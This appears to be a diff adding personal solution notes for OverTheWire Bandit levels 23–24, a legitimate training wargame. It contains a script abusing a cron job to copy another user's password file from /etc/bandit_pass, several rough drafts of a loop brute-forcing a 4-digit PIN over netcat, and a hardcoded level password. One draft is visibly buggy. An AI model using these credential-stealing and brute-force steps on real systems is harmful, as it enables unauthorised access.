@@ -1,0 +1,93 @@
+overthewire.org bandit useful
+
+LEVEL23:
+===================
+/etc/cron.d/cronjob_bandit24
+===================
+
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+====================
+/usr/bin/cronjob_bandit24.sh
+====================
+
+
+#!/bin/bash
+/var/spool/bandit24
+
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        timeout -s 9 60 "./$i"
+        rm -f "./$i"
+    fi
+done
+
+
+==================
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/tmp/pass 
+
+============================
+
+nc localhost 30002
+port 30002
+
+
+--------------------
+
+#!/bin/bash
+
+mypass=$UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+echo "Code: $myname"
+for (( i=0; i <= 9999; ++i ))
+do
+	echo "$myname $i"
+done
+---------------------------
+
+#!/bin/bash
+
+mypass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+echo "Code: $mypass"
+for (( i=0; i <= 9999; ++i ))
+do
+        echo "$mypass $i" >> /tmp/output
+done
+
+
+
+---------------------
+
+
+#!/bin/bash
+
+mypass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+nc localhost 30002 >> /tmp/tmp/output241 2>&1
+
+#echo "$mypass" >> test24 
+
+#echo "Code: $mypass"
+for (( i=0; i <= 9999; ++i ))
+do
+        echo "$mypass $i"  >> /tmp/tmp/output2$
+        (echo "$mypass $i" | nc localhost 30002) >> /tmp/tmp/output2$
+done
+
+
+
+
+
+
+
